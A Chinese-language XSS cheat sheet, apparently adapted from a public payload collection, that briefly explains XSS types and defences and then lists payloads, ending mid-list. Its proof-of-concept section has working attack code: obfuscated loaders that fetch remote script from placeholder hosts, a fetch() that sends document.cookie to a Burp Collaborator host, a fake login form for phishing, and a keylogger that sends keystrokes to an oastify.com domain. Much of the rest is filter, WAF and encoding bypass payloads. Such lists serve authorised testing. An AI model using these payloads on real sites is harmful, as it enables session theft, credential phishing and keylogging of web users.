# 跨站脚本（XSS）

> 跨站脚本（XSS）是一种通常在Web应用程序中发现的安全漏洞。XSS使攻击者能够将HTML或JS代码插入其他用户查看的网页中。
> 
> 攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。
> 
> XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。

## 目录

- [XSS漏洞介绍](#xss漏洞介绍)
  - [Exploit && POC](#exploit-poc)
      - [经典POC，推荐搭配XSS平台使用](#经典poc-推荐搭配xss平台使用)
      - [利用Burp自带DNSLOG平台以CORS的方式打cookie](#利用burp自带dnslog平台以cors的方式打cookie)
      - [表单钓鱼](#表单钓鱼)
      - [JS键盘记录器](#js键盘记录器)
  - [确认XSS触发点](#确认xss触发点)
      - [XSS工具](#xss工具)
  - [HTML中的xss payload](#html中的xss-payload)
      - [常见 Payloads](#常见-payloads)
      - [HTML5标签的xss payload](#html5标签的xss-payload)
      - [XSS加载远程js payload](#xss加载远程js-payload)
      - [hidden input下的XSS](#hidden-input下的xss)
      - [HTML实体编码XSS payload](#html实体编码xss-payload)
      - [输出点在js代码中的XSS](#输出点在js代码中的xss)
  - [URI中执行javascript和data类payload](#uri中执行javascript和data类payload)
  - [特定文件名后缀的XSS](#特定文件名后缀的xss)
      - [XML](#xml文件执行javascript)
      - [SVG](#svg文件执行javascript)
      - [Markdown](#markdown格式xss)
      - [CSS](#css中的xss)
  - [XSS盲打](#xss盲打)
      - [XSS Hunter](#xss-hunter)
      - [更多的XSS盲打工具](#更多的xss盲打工具)
      - [XSS盲打点](#xss盲打点)
  - [mXSS](#mxss)
  - [多语言XSS](#多语言xss)
  - [过滤绕过 payloads](#过滤绕过-payloads)
      - [大小写绕过](#大小写绕过)
      - [黑名单绕过](#黑名单绕过)
      - [通过eval绕过黑名单](#通过eval绕过黑名单)
      - [不完整的html标签绕过XSS黑名单](#不完整的html标签绕过xss黑名单)
      - [不使用双引号的payload（当双引号被过滤）](#不使用双引号的payload-双引号被过滤)
      - [绕过script标签中的双引号](#绕过script标签中的双引号)
      - [绕过MouseDown事件中的双引号](#绕过mousedown事件中的双引号)
      - [绕过括号](#绕过括号)
      - [绕过括号和分号](#绕过括号和分号)
      - [绕过 onxxxx 黑名单](#绕过onxxxx黑名单)
      - [绕过空格过滤](#绕过空格过滤)
      - [email过滤绕过](#email过滤绕过)
      - [绕过document 过滤](#绕过document-过滤)
      - [绕过document.cookie 过滤](#绕过document-cookie-过滤)
      - [强制闭合script无视单双引号包裹](#强制闭合script无视单双引号包裹)
      - [使用另一种重定向方式绕过](#使用另一种重定向方式绕过)
      - [使用另一种执行alert的方式绕过](#使用另一种执行alert的方式绕过)
      - [不使用">"](#不使用)
      - [使用Unicode编码绕过"<" 和 ">"](#使用unicode编码绕过-和-)
      - [绕过 ";" 使用另一种字符](#绕过-使用另一种字符)
      - [使用HTML encoding bypass](#使用html-encoding-bypass)
      - [使用Katakana绕过](#使用katakana绕过)
      - [使用楔形文字绕过](#使用楔形文字绕过)
      - [使用Lontara绕过](#使用lontara绕过)
      - [使用ECMAScript6绕过](#使用ecmascript6绕过)
      - [使用8进制绕过](#使用8进制绕过)
      - [使用unicode绕过](#使用unicode绕过)
      - [使用UTF-8绕过](#使用utf-8绕过)
      - [使用UTF-16be绕过](#使用utf-16be绕过)
      - [使用UTF-32绕过](#使用utf-32绕过)
      - [使用 BOM绕过](#使用-bom绕过)
      - [使用各种编码绕过](#使用各种编码绕过)
      - [使用jsfuck绕过](#使用jsfuck绕过)
  - [绕过CSP](#绕过csp)
      - [使用 Google 的 JSONP 绕过 CSP (Trick by [@apfeifer27](https://twitter.com/apfeifer27))](#使用-google-的-jsonp-绕过-csp-trick-by-apfeifer27)
      - [绕过CSP by lab.wallarm.com](#绕过csp-by-labwallarmcom)
      - [绕过CSP by [Rhynorater]](#绕过csp-by-rhynorater)
      - [绕过CSP by @akita_zen](#绕过csp-by-akita_zen)
      - [绕过CSP by @404death](#绕过csp-by-404death)
  - [常见WAF绕过](#常见waf绕过)
      - [Cloudflare XSS 绕过 by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
      - [记录时间：2021 年 1 月 25 日](#记录时间2021-年-1-月-25-日)
      - [记录时间：2020 年 4 月 21 日](#记录时间-2020-年-4-月-21-日)
      - [记录时间：2019 年 8 月 22 日](#记录时间-2019-年-8-月-22-日)
      - [记录时间：2019 年 6 月 5 日](#记录时间-2019-年-6-月-5-日)
      - [记录时间：2019 年 6 月 3 日](#记录时间-2019-年-6-月-3-日)
      - [Cloudflare WAF 绕过 - 2019 年 3 月 22 日 (by @RakeshMane10)](#cloudflare-waf-bypass---2019-年-3-月-22-日-by-rakeshmane10)
      - [Cloudflare XSS 绕过 - 27th February 2018](#cloudflare-waf-bypass---2018-年-2-月-27-日)
      - [Chrome Auditor 绕过 - 2018 年 8 月 9 日](#chrome-auditor---2018-年-8-月-9-日)
      - [XSS bypass备忘清单](#xss-bypass备忘清单)
  - [XSS实验室](#xss实验室)
  - [参考](#参考)

## XSS漏洞介绍

跨站点脚本(XSS)是一种通常在Web应用程序中发现的计算机安全漏洞。XSS允许攻击者将恶意代码注入网站，然后在访问该网站的任何人的浏览器中执行。这使得攻击者能够窃取敏感信息，如用户登录凭据，或执行其他恶意操作。

XSS攻击主要有3种类型：

* **反射 XSS**: 在反射的XSS攻击中，将带有HTML或JS恶意代码的URL发送给受害者，当受害者点击链接时，恶意代码就会在他们的浏览器中执行。例如，攻击者可以创建包含恶意JavaScript的链接，并通过电子邮件将其发送给受害者。当受害者单击该链接时，会在他们的浏览器中执行JavaScript代码，从而允许攻击者执行各种操作，如窃取他们的登录凭据。

* **存储 XSS**: 在存储的XSS攻击中，恶意代码存储在服务器上，并在每次访问被植入恶意代码的URL时执行。例如，攻击者可以向一篇博客文章的评论中注入JavaScript代码或HTML代码。当其他用户查看博客帖子时，注入的JavaScript代码或HTML代码会在他们的浏览器中执行，从而允许攻击者执行各种操作。

* **DOM XSS**: 当存在漏洞的 Web 应用程序修改用户浏览器中的 DOM（文档对象模型）时，就会发生这种攻击。 当用户输入用于以某种方式更新页面的 HTML 或 JavaScript 代码时，就会发生这种情况。 在基于 DOM 的 XSS 攻击中，恶意代码不会发送到服务器，而是直接在用户的浏览器中执行。

XSS漏洞本质上是一种HTML注入，也就是将HTML 或JavaScript 代码注入到网页中。其防御的方式就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义。
过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” < “，” > “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。
对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。


## Exploit && POC

### 经典POC，推荐搭配XSS平台使用

```html
<script src=http://url/x.js></script>

</tExtArEa>'"><sCRiPt sRC=http://xss.url/x.js></sCrIpT>

'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnhzcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>

<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.url/x.js';>

</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fxss.url%2Fx.js%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>

'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnhzcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
```


### 利用Burp自带DNSLOG平台以CORS的方式打cookie

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### 表单钓鱼

利用 XSS 修改页面的 HTML 内容，显示钓鱼表单，以下为示例代码：

```html
<script>
history.replaceState(null, null, '../../../login');//这段代码会将当前浏览器显示的URL会跳转到/login，达到迷惑效果。
document.write("</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>")
</script>
```

### JS键盘记录器

另一种收集敏感数据的方法是设置一个JS键盘记录器。
注：yuw08jzgc8gzb04m6xr7kq29u00qof.oastify.com这个域名是Burp自带的DNSLOG平台，可以用来接收数据。

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("https://yuw08jzgc8gzb04m6xr7kq29u00qof.oastify.com/?"+String.fromCharCode(e.which))},this.remove();'>
```


## 确认XSS触发点

此payload在浏览器中会打开调试器，而不是触发弹出警报框。
```javascript
<script>debugger;</script>
```

使用[沙箱](https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html)
> 沙箱安全地托管各种类型用户上传的内容。 其中许多沙箱专门用于隔离用户上传的 HTML、JavaScript 或 Flash 小程序，并确保它们无法访问任何用户数据。

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

因此，最好使用 `alert(document.domain)` 或 `alert(window.origin)` 而不是`alert(1)` 作为默认 XSS payload，以便了解 XSS 实际在哪个范围内执行。

将 `<script>alert(1)</script>` 换成更好的payload:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

虽然`alert()` 作为反射型XSS常用验证payload，但是如果在具备自然流量的存储XSS页面使用`alert()`可能会对用户造成影响，因此建议验证漏洞时可以使用`console.log()`，如`console.log(6666)`，这样可以在F12控制台中的console中弹出消息，而不会直接弹框影响用户体验。

例子:

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```
#### 如下图所示
![Alt text](./x1.jpg)


参考链接:

- [谷歌漏洞猎人 - 沙箱域中的 XSS](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow 视频 - 测试XSS时请勿使用alert(1)](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow 文章 - 测试XSS时请勿使用alert(1)](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### XSS工具

大多数工具适用于XSS盲打:

* [XSSStrike](https://github.com/s0md3v/XSStrike): 国外很受欢迎的工具，但已经很久没更新了
* [xsser](https://github.com/epsylon/xsser): 利用无头浏览器检测 XSS 漏洞
* [Dalfox](https://github.com/hahwul/dalfox): Go写的一款XSS工具 ，功能丰富且速度极快
* [XSpear](https://github.com/hahwul/XSpear): 与 Dalfox 类似，但Ruby写的
* [domdig](https://github.com/fcavallarin/domdig): 无头 Chrome XSS 测试器
* [XSS平台源码](https://github.com/AntSwordProject/ant): 常用于各种XSS盲打，建议自行搭建。

## HTML中的xss payload

### 常见 Payloads

```javascript
// 基础payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### HTML5标签的xss payload

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // 在手指触摸屏幕时触发
<body ontouchend=alert(1)>   // 当手指从触摸屏上移开时触发
<body ontouchmove=alert(1)>  // 当手指在屏幕上拖动时触发
```

### XSS加载远程js payload

```html
<script src=http://url/x.js></script>

</tExtArEa>'"><sCRiPt sRC=http://xss.url/x.js></sCrIpT>

'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnhzcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>

<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.url/x.js';>

</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fxss.url%2Fx.js%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>

'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnhzcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
```

### hidden input下的XSS

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
//hidden input 下的xss基本不能利用，这个一直没有很好的payload，能打的基本是self-xss，而且限定浏览器。
```

### HTML实体编码XSS payload


`<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>`

`<IMG SRC=1 ONERROR=&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;(1)>`

在线转换网站 -> [https://evilcos.me/lab/xssor/](https://evilcos.me/lab/xssor/)


### 输出点在js代码中的XSS

#### 例子1
```javascript
    <script type = "text/javascript">

        var obj = new Object();
        obj.name = "华仔";
        obj.age = 18; //可控点在18这个位置，假设参数age=18

        obj.fun = function (){
            alert("姓名：" + this.name + ",年龄：" + this.age);
        }

        //alert(obj.name);        
        obj.fun();               
        
    </script>
```
#### 例子1POC

```javascript
    <script type = "text/javascript">

        var obj = new Object();
        obj.name = "华仔";
        obj.age = 18;alert(1); //插入payload 18;alert(1);

        obj.fun = function (){
            alert("姓名：" + this.name + ",年龄：" + this.age);
        }

        //alert(obj.name);        
        obj.fun();               
        
    </script>
```
 > 上述POC中可控点在18，输入18;alert(1);即可执行alert(1)，因为js以";"号作为结束。

#### 例子2
```javascript
    <script type = "text/javascript">

        var obj = new Object();
        obj.name = "华仔";
        obj.age = "18"; //可控点在18这个位置，假设参数age=18

        obj.fun = function (){
            alert("姓名：" + this.name + ",年龄：" + this.age);
        }

        //alert(obj.name);        
        obj.fun();               
        
    </script>
```
#### 例子2POC

```javascript
    <script type = "text/javascript">

        var obj = new Object();
        obj.name = "华仔";
        obj.age = "18";alert(1);//" //这里的payload变为 18";alert(1);//

        obj.fun = function (){
            alert("姓名：" + this.name + ",年龄：" + this.age);
        }

        //alert(obj.name);        
        obj.fun();               
        
    </script>
```
 > 上述POC中可控点在18，但是这里有双引号包裹在其中，如果我们需要成功执行alert(1)则需要成功闭合双引号，所以payload更改为`18";alert(1);//`。

更多的XSS学习资料请参考以前乌云上的一起学XSS实战案例
[一起学XSS_page2](https://wy.zone.ci/searchbug.php?q=%E4%B8%80%E8%B5%B7%E5%AD%A6xss&page=1)
[一起学XSS_page1](https://wy.zone.ci/searchbug.php?q=%E4%B8%80%E8%B5%B7%E5%AD%A6xss&page=2)

## URI中执行javascript和data类payload

javascript:

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

//将 "javascript:" 利用hex或8进制编码
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

//javascript中加入特殊字符 换行 制表符 
java%0ascript:alert(1)   - 换行符 (\n)
java%09script:alert(1)   - 制表符 (\t)
java%0dscript:alert(1)   - 换行 (\r)

//使用转义字符
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

//使用换行符%0a
`javascript://%0Aalert(1)`
`javascript://anything%0D%0A%0D%0Awindow.alert(1)`
```

data协议的XSS:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

vbscript协议XSS 只能在IE浏览器执行

```javascript
vbscript:msgbox("XSS")
```

## 特定文件名后缀的XSS

**注意** ：此处使用 XML CDATA 部分，以便 JavaScript payload不会被视为 XML 标记。

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XML文件执行javascript

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```
>将上述代码保存为x.xml，然后将x.xml上传到一个网站目录下，访问http://url/x.xml，即可触发javascript。此漏洞常见于一些允许上传xml的系统，如ueditor编辑器。

### SVG文件执行javascript

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

### SVG文件执行javascript (短payload)

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### Markdown格式XSS

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

>更多的payload请参考同目录下的文件夹./files



### CSS中的XSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## XSS盲打

### XSS Hunter

> XSS Hunter 可以让您发现各种XSS漏洞，包括经常被忽略的盲打 XSS。 该服务通过托管专门的 XSS 探测器来工作，这些探测器在触发时扫描页面并将有关易受攻击页面的信息发送到 XSS Hunter 上。


旧版的XSS Hunter已经弃用，平替版如下:
*  [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
* 在线版 [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

### 更多的XSS盲打工具

- [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
- [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
- [ezXSS - ssl](https://github.com/ssl/ezXSS)
- [国产XSS平台](https://github.com/AntSwordProject/ant)
- 或可选择国内的XSS平台（有被偷cookie的风险，建议自行分辨）

### XSS盲打点

- 各种填写信息的表单
- 留言板
- 投诉/投稿等
- 论坛发帖
- Referer头
  - 网站统计工具
  - 后台操作日志（可能包含Referer）
- 浏览器UA
  - 网站统计工具
  - 后台操作日志（可能包含UA）




## mXSS

更多的详细介绍参考
[mXSS攻击的成因及常见种类](https://wooyun.js.org/drops/mXSS%E6%94%BB%E5%87%BB%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%A7%8D%E7%B1%BB.html)



## 多语言XSS

多语言XSS - 0xsobky

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

多语言XSS - Ashar Javed

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

多语言XSS - Mathias Karlsson

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

多语言XSS - Rsnake

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

多语言XSS - Daniel Miessler

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

多语言XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
![Alt text](./DWiLk3UX4AE0jJs.jpg)


```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

![Alt text](./DWfIizMVwAE2b0g.jpg)



```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

多语言XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)

```javascript
# by crlf
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

# by europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

# by EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

# by h1/ragnar
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

多语言XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)
```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

## 过滤绕过 payloads

### 大小写绕过

```javascript
<sCrIpt>alert(1)</ScRipt>
```

### 黑名单绕过

```javascript
<script x>
<script x>alert('XSS')<script y>
```

### 通过eval绕过黑名单

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

### 不完整的html标签绕过XSS黑名单

限 IE/Firefox/Chrome/Safari 浏览器

```javascript
<img src='1' onerror='alert(0)' <
```

### 不使用双引号的payload 双引号被过滤

```javascript
String.fromCharCode(88,83,83)
```

### 绕过script标签中的双引号

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

### 绕过MouseDown事件中的双引号

您可以在onmousedown事件中使用以下payload绕过双引号

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```


将IP地址转换为10进制形式 `http://192.168.1.1` == `http://3232235777`
http://www.geektools.com/cgi-bin/ipconv.cgi

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

使用eval执行base64编码payload `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

### 绕过括号

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

### 绕过括号和分号

```javascript
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### 绕过onxxxx黑名单

```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

// Bypass onxxx= filter with a null byte/vertical tab
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />

// Bypass onxxx= filter with a '/'
<img src='1' onerror/=alert(0) />
```

### 绕过空格过滤

```javascript
// Bypass space filter with "/"
<img/src='1'/onerror=alert(0)>

// Bypass space filter with 0x0c/^L
<svgonload=alert(1)>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

### email过滤绕过

([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))

```javascript
"><svg/onload=confirm(1)>"@x.y
```

### 绕过document 过滤

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

### 绕过document cookie 过滤

This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.

```
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

### 强制闭合script无视单双引号包裹

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

### 使用另一种重定向方式绕过

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

### 使用另一种执行alert的方式绕过

From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
